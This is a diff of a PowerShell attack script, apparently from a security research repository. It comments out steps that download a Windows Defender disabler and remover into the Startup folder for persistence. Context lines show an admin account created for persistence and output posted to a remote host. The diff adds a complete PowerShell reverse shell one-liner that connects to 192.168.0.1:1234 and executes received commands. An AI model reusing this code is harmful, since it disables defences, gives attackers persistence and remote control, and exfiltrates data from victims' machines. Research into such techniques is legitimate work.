@@ -23,16 +23,16 @@ $dirPath = New-RandomTempDirectory
 # Write-Host "Created directory: $dirPath"
 
 # Download windows disabler
-$startupPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup"
-$url = "https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/disableWinDef.ps1"
-$outFile = Join-Path $startupPath "disableWinDef.ps1"
-Invoke-WebRequest -Uri $url -OutFile $outFile
+# $startupPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup"
+# $url = "https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/disableWinDef.ps1"
+# $outFile = Join-Path $startupPath "disableWinDef.ps1"
+# Invoke-WebRequest -Uri $url -OutFile $outFile
 
 # Download windows defender and uac remover
-$startupPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup"
-$url = "https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/defender_remover13.exe"
-$outFile = Join-Path $startupPath "defender_remover.exe"
-Invoke-WebRequest -Uri $url -OutFile $outFile
+# $startupPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup"
+# $url = "https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/defender_remover13.exe"
+# $outFile = Join-Path $startupPath "defender_remover.exe"
+# Invoke-WebRequest -Uri $url -OutFile $outFile
 
 # Create Admin account for persistence
 # Run PowerShell as Administrator
@@ -84,6 +84,7 @@ Invoke-WebRequest `
     -Method POST `
     -Body $output `
     -ContentType "text/plain"
+
 $client = New-Object System.Net.Sockets.TCPClient('192.168.0.1',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 '@ | Set-Content -Path $filePath -Encoding UTF8
 
